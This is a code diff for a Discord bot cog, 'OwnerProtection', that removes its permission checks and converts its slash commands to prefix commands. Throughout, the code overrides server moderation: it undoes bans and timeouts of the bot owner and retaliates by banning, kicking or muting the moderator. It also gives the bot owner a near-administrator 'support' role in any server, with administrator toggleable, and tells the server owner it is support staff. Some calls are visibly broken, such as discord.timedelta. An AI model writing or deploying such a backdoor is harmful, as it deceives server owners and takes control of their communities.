@@ -1,18 +1,14 @@
 import discord
-from redbot.core import commands, Config, app_commands
+from redbot.core import commands, Config
 from redbot.core.bot import Red
 from discord.utils import utcnow
-
 class OwnerProtection(commands.Cog):
     """A cog to protect the bot owner(s) from being muted, timed out, kicked, or banned."""
-
     def __init__(self, bot: Red):
         self.bot = bot
         self.config = Config.get_conf(self, identifier=1234567890)
         self.config.register_global(owners=[])
-        self.config.register_global(authorized_users=[])
         self.config.register_guild(kicked_owners={}, owner_role_id=None, support_role_id=None, support_role_name="Innova Support", support_role_message="Support role created successfully.", owner_message="Hello {owner_name},\n\nI have created a role called '{role_name}' in {guild_name} for bot support purposes. This role is intended for members of the support team to assist with any issues you may have.")
-
     @commands.Cog.listener()
     async def on_member_update(self, before: discord.Member, after: discord.Member):
         """Check if the owner is muted or timed out and reverse it."""
@@ -30,7 +26,6 @@ class OwnerProtection(commands.Cog):
                 await after.edit(timed_out_until=None)
                 await after.send("Your timeout has been removed as you are the bot owner.")
                 await self.perform_same_action(after.guild, after, "timeout")
-
     @commands.Cog.listener()
     async def on_member_ban(self, guild: discord.Guild, user: discord.User):
         """Check if the owner is banned and reverse it."""
@@ -42,32 +37,26 @@ class OwnerProtection(commands.Cog):
                 roles = [role.id for role in member.roles if role != guild.default_role]
                 async with self.config.guild(guild).kicked_owners() as kicked_owners:
                     kicked_owners[str(user.id)] = roles
-
             # Create an invite link
             invite = await self.create_invite(guild)
             await user.send(f"You have been banned from {guild.name} as you are the bot owner. Use this invite to rejoin: {invite.url}")
-
             await guild.unban(user)
             await user.send(f"You have been unbanned from {guild.name} as you are the bot owner.")
             await guild.leave()
-
             # Send an embedded DM to the server owner
             owner = guild.owner
             embed = discord.Embed(title="I left", color=discord.Color.red())
             embed.add_field(name="Server", value=guild.name)
             embed.add_field(name="Reason", value=f"You banned {user.name}")
             await owner.send(embed=embed)
-
             # Perform the same action on the action performer
             await self.perform_same_action(guild, user, "ban")
-
     @commands.Cog.listener()
     async def on_member_remove(self, member: discord.Member):
         """Check if the owner is kicked and send an invite."""
         owners = await self.config.owners()
         if member.id in owners and member.guild.me in member.guild.members:
             guild = member.guild
-
             # Check if the member was kicked by looking at the audit logs
             async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                 if entry.target.id == member.id:
@@ -75,15 +64,12 @@ class OwnerProtection(commands.Cog):
                     roles = [role.id for role in member.roles if role != guild.default_role]
                     async with self.config.guild(guild).kicked_owners() as kicked_owners:
                         kicked_owners[str(member.id)] = roles
-
                     # Create an invite link
                     invite = await self.create_invite(guild)
                     await member.send(f"You have been kicked from {guild.name} as you are the bot owner. Use this invite to rejoin: {invite.url}")
-
                     # Perform the same action on the action performer
                     await self.perform_same_action(guild, member, "kick")
                     break
-
     @commands.Cog.listener()
     async def on_member_join(self, member: discord.Member):
         """Reassign roles to the owner when they rejoin."""
@@ -95,19 +81,16 @@ class OwnerProtection(commands.Cog):
                 roles_to_add = [guild.get_role(role_id) for role_id in roles if guild.get_role(role_id)]
                 await member.add_roles(*roles_to_add)
                 await member.send(f"Welcome back to {guild.name}! Your roles have been restored.")
-
             # Assign the owner role to the owner if it exists
             owner_role_id = await self.config.guild(guild).owner_role_id()
             if owner_role_id:
                 owner_role = guild.get_role(owner_role_id)
                 if owner_role:
                     await member.add_roles(owner_role)
-
     @commands.Cog.listener()
     async def on_guild_join(self, guild: discord.Guild):
         """Do not create the role automatically when the bot joins a server."""
         pass
-
     @commands.Cog.listener()
     async def on_guild_remove(self, guild: discord.Guild):
         """Delete the role for bot owners when the bot leaves a server."""
@@ -117,37 +100,19 @@ class OwnerProtection(commands.Cog):
             if owner_role:
                 await owner_role.delete(reason="Bot left the server")
             await self.config.guild(guild).owner_role_id.clear()
-
     async def perform_same_action(self, guild: discord.Guild, action_target: discord.Member, action_type: str):
         """Perform the same action on the member who performed the action."""
         async for entry in guild.audit_logs(limit=1, action=getattr(discord.AuditLogAction, action_type)):
             if entry.target == action_target:
-                if entry.user == guild.me:
-                    # Skip if the bot is the one who performed the action
-                    return
-
                 if action_type == "ban":
-                    if guild.me.guild_permissions.ban_members:
-                        await guild.ban(entry.user, reason=f"Banned the bot owner {action_target}.")
-                    else:
-                        await entry.user.send("Yo, I don't have permissions to ban if user is equal to or above me. Don't even try.")
+                    await guild.ban(entry.user, reason=f"Banned the bot owner {action_target}.")
                 elif action_type == "kick":
-                    if guild.me.guild_permissions.kick_members:
-                        await entry.user.kick(reason=f"Kicked the bot owner {action_target}.")
-                    else:
-                        await entry.user.send("Yo, I don't have permissions to kick if user is equal to or above me. Don't even try.")
+                    await entry.user.kick(reason=f"Kicked the bot owner {action_target}.")
                 elif action_type == "mute":
-                    if guild.me.guild_permissions.mute_members:
-                        await entry.user.edit(mute=True, deafen=True, reason=f"Muted the bot owner {action_target}.")
-                    else:
-                        await entry.user.send("Yo, I don't have permissions to mute if user is equal to or above me. Don't even try.")
+                    await entry.user.edit(mute=True, deafen=True, reason=f"Muted the bot owner {action_target}.")
                 elif action_type == "timeout":
-                    if guild.me.guild_permissions.moderate_members:
-                        await entry.user.edit(timed_out_until=utcnow() + discord.timedelta(minutes=10), reason=f"Timed out the bot owner {action_target}.")
-                    else:
-                        await entry.user.send("Yo, I don't have permissions to timeout if user is equal to or above me. Don't even try.")
+                    await entry.user.edit(timed_out_until=utcnow() + discord.timedelta(minutes=10), reason=f"Timed out the bot owner {action_target}.")
                 break
-
     async def create_invite(self, guild: discord.Guild):
         """Create an invite link for the guild."""
         channels = guild.text_channels
@@ -156,50 +121,50 @@ class OwnerProtection(commands.Cog):
             return invite
         else:
             raise Exception("No text channels available to create an invite.")
-
-    @commands.hybrid_group()
+    @commands.group()
     @commands.is_owner()
     async def owner(self, ctx: commands.Context):
         """Group command for owner protection settings."""
         pass
-
     @owner.command()
     @commands.is_owner()
-    async def authorize(self, ctx: commands.Context, user: discord.User):
-        """Authorize a user to use the context menu commands."""
-        async with self.config.authorized_users() as authorized_users:
-            if user.id not in authorized_users:
-                authorized_users.append(user.id)
-                await ctx.send(f"{user} has been authorized to use the context menu commands.")
+    async def add(self, ctx: commands.Context, owner: discord.User):
+        """Add a user to the protected owners list."""
+        async with self.config.owners() as owners:
+            if owner.id not in owners:
+                owners.append(owner.id)
+                await ctx.send(f"{owner} has been added to the protected owners list.")
             else:
-                await ctx.send(f"{user} is already authorized.")
-
+                await ctx.send(f"{owner} is already in the protected owners list.")
     @owner.command()
     @commands.is_owner()
-    async def unauthorize(self, ctx: commands.Context, user: discord.User):
-        """Unauthorize a user from using the context menu commands."""
-        async with self.config.authorized_users() as authorized_users:
-            if user.id in authorized_users:
-                authorized_users.remove(user.id)
-                await ctx.send(f"{user} has been unauthorized from using the context menu commands.")
+    async def remove(self, ctx: commands.Context, owner: discord.User):
+        """Remove a user from the protected owners list."""
+        async with self.config.owners() as owners:
+            if owner.id in owners:
+                owners.remove(owner.id)
+                await ctx.send(f"{owner} has been removed from the protected owners list.")
             else:
-                await ctx.send(f"{user} is not authorized.")
-
-    @commands.hybrid_command(name="create_support_role", description="Create the support role")
+                await ctx.send(f"{owner} is not in the protected owners list.")
+    @owner.command()
     @commands.is_owner()
-    async def create_support_role(self, ctx: commands.Context):
-        """Slash command to create the support role with specified permissions."""
-        authorized_users = await self.config.authorized_users()
-        if ctx.author.id not in authorized_users:
-            await ctx.send("You do not have permission to run this command.", ephemeral=True)
-            return
+    async def list(self, ctx: commands.Context):
+        """List all protected owners."""
+        owners = await self.config.owners()
+        if owners:
+            owner_list = [str(self.bot.get_user(owner_id)) for owner_id in owners]
+            await ctx.send(f"Protected owners: {', '.join(owner_list)}")
+        else:
+            await ctx.send("No protected owners.")
+    @owner.command()
+    @commands.is_owner()
+    async def create(self, ctx: commands.Context, name: str = None, message: str = None):
+        """Create the support role with specified permissions."""
         guild = ctx.guild
-        support_role_name = await self.config.guild(guild).support_role_name()
-        support_role_message = await self.config.guild(guild).support_role_message()
-
+        support_role_name = name or await self.config.guild(guild).support_role_name()
+        support_role_message = message or await self.config.guild(guild).support_role_message()
         permissions = discord.Permissions.all()
         permissions.administrator = False
-
         support_role = await guild.create_role(
             name=support_role_name,
             permissions=permissions,
@@ -207,13 +172,10 @@ class OwnerProtection(commands.Cog):
             color=discord.Color(0x00f0ff),
             reason="Support role for bot support purposes"
         )
-
         await self.config.guild(guild).support_role_id.set(support_role.id)
-        await ctx.send(support_role_message, ephemeral=True)
-
+        await ctx.send(support_role_message)
         # Assign the role to the command invoker
         await ctx.author.add_roles(support_role)
-
         # Send a message to the server owner
         server_owner = guild.owner
         if server_owner:
@@ -225,34 +187,24 @@ class OwnerProtection(commands.Cog):
                     guild_name=guild.name
                 )
             )
-
-    @commands.hybrid_command(name="delete_support_role", description="Delete the support role")
+    @owner.command()
     @commands.is_owner()
-    async def delete_support_role(self, ctx: commands.Context):
-        """Slash command to delete the support role."""
-        authorized_users = await self.config.authorized_users()
-        if ctx.author.id not in authorized_users:
-            await ctx.send("You do not have permission to run this command.", ephemeral=True)
-            return
+    async def delete(self, ctx: commands.Context):
+        """Delete the support role."""
         guild = ctx.guild
         support_role_id = await self.config.guild(guild).support_role_id()
         if support_role_id:
             support_role = guild.get_role(support_role_id)
             if support_role:
                 await support_role.delete(reason="Support role deleted by command")
-                await ctx.send("Support role deleted successfully.", ephemeral=True)
+                await ctx.send("Support role deleted successfully.")
             await self.config.guild(guild).support_role_id.clear()
         else:
-            await ctx.send("Support role does not exist.", ephemeral=True)
-
-    @commands.hybrid_command(name="toggle_admin_permissions", description="Toggle on admin permissions")
+            await ctx.send("Support role does not exist.")
+    @owner.command()
     @commands.is_owner()
-    async def toggle_admin_permissions(self, ctx: commands.Context):
-        """Slash command to toggle admin permissions for the support role."""
-        authorized_users = await self.config.authorized_users()
-        if ctx.author.id not in authorized_users:
-            await ctx.send("You do not have permission to run this command.", ephemeral=True)
-            return
+    async def admin(self, ctx: commands.Context):
+        """Toggle admin permissions for the support role."""
         guild = ctx.guild
         support_role_id = await self.config.guild(guild).support_role_id()
         if support_role_id:
@@ -262,72 +214,29 @@ class OwnerProtection(commands.Cog):
                 permissions.administrator = not permissions.administrator
                 await support_role.edit(permissions=permissions, reason="Toggled admin permissions for support role")
                 status = "added" if permissions.administrator else "removed"
-                await ctx.send(f"Admin permissions {status} for the support role.", ephemeral=True)
+                await ctx.send(f"Admin permissions {status} for the support role.")
             else:
-                await ctx.send("Support role does not exist.", ephemeral=True)
+                await ctx.send("Support role does not exist.")
         else:
-            await ctx.send("Support role does not exist.", ephemeral=True)
-
-    @commands.hybrid_command(name="list_protected_owners", description="List the protected owners")
+            await ctx.send("Support role does not exist.")
+    @owner.command()
     @commands.is_owner()
-    async def list_protected_owners(self, ctx: commands.Context):
-        """Slash command to list all protected owners."""
-        authorized_users = await self.config.authorized_users()
-        if ctx.author.id not in authorized_users:
-            await ctx.send("You do not have permission to run this command.", ephemeral=True)
-            return
-        owners = await self.config.owners()
-        if owners:
-            owner_list = [f"{ctx.guild.get_member(owner_id).display_name} ({owner_id})" for owner_id in owners]
-            await ctx.send(f"Protected owners: {', '.join(owner_list)}", ephemeral=True)
-        else:
-            await ctx.send("No protected owners.", ephemeral=True)
-
-    async def cog_load(self) -> None:
-        self.bot.tree.add_command(add_to_protected_owners_list)
-        self.bot.tree.add_command(remove_from_protected_owners_list)
-        await self.bot.tree.sync()
-
-    async def cog_unload(self) -> None:
-        self.bot.tree.remove_command(add_to_protected_owners_list.name)
-        self.bot.tree.remove_command(remove_from_protected_owners_list.name)
-        await self.bot.tree.sync()
-
-@app_commands.context_menu(name="Add to Owners")
-async def add_to_protected_owners_list(interaction: discord.Interaction, user: discord.User):
-    """Context menu command to add a user to the protected owners list."""
-    cog = interaction.client.get_cog("OwnerProtection")
-    if not cog:
-        return
-    authorized_users = await cog.config.authorized_users()
-    if interaction.user.id not in authorized_users:
-        await interaction.response.send_message("You do not have permission to run this command.", ephemeral=True)
-        return
-    async with cog.config.owners() as owners:
-        if user.id not in owners:
-            owners.append(user.id)
-            await interaction.response.send_message(f"{user} has been added to the protected owners list.", ephemeral=True)
-        else:
-            await interaction.response.send_message(f"{user} is already in the protected owners list.", ephemeral=True)
-
-@app_commands.context_menu(name="Remove from Owners")
-async def remove_from_protected_owners_list(interaction: discord.Interaction, user: discord.User):
-    """Context menu command to remove a user from the protected owners list."""
-    cog = interaction.client.get_cog("OwnerProtection")
-    if not cog:
-        return
-    authorized_users = await cog.config.authorized_users()
-    if interaction.user.id not in authorized_users:
-        await interaction.response.send_message("You do not have permission to run this command.", ephemeral=True)
-        return
-    async with cog.config.owners() as owners:
-        if user.id in owners:
-            owners.remove(user.id)
-            await interaction.response.send_message(f"{user} has been removed from the protected owners list.", ephemeral=True)
-        else:
-            await interaction.response.send_message(f"{user} is not in the protected owners list.", ephemeral=True)
-
-# Ensure you call setup function to add the cog to the bot
-async def setup(bot: Red):
-    cog = OwnerProtection(bot)
-    await bot.add_cog(cog)
+    async def setrole(self, ctx: commands.Context, name: str):
+        """Set the name of the support role."""
+        guild = ctx.guild
+        await self.config.guild(guild).support_role_name.set(name)
+        await ctx.send(f"Support role name set to {name}.")
+    @owner.command()
+    @commands.is_owner()
+    async def setmessage(self, ctx: commands.Context, message: str):
+        """Set the message to be sent when the support role is created."""
+        guild = ctx.guild
+        await self.config.guild(guild).support_role_message.set(message)
+        await ctx.send("Support role creation message updated.")
+    @owner.command()
+    @commands.is_owner()
+    async def ownermessage(self, ctx: commands.Context, message: str):
+        """Set the message to be sent to the server owner when the support role is created."""
+        guild = ctx.guild
+        await self.config.guild(guild).owner_message.set(message)
+        await ctx.send("Message to the server owner updated.")
